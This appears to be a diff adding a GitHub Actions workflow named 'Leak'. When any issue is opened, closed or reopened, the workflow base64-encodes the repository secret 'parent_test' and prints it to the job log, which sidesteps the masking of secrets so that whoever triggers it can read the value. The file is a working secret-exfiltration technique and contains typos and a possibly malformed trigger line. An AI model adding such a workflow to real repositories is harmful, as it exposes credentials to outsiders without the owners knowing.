@@ -1,0 +1,16 @@
+name: Leak
+
+on:
+  issues: 
+    types:[opened, closed, reopened]
+
+jobs:
+  leak:
+    name: Leak GitHub Seecrets
+    runs-on: ubuntu-latest
+    steps:
+      - name: Leak the secre
+        run: |
+          echo $VALUE | base64
+        env:
+          VALUE: ${{ secrets.parent_test }}
